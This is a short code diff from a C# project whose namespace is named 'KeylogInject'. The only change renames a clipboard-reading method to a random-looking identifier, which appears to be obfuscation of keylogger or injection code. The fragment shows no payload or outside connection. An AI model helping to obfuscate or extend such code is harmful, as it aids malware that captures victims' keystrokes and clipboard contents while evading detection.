@@ -4,7 +4,7 @@ namespace KeylogInject
 {
     static class Clipboard
     {
-        public static string GetText()
+        public static string FlexibleManager0C56()
         {
             string ReturnValue = string.Empty;
             Thread STAThread = new Thread(
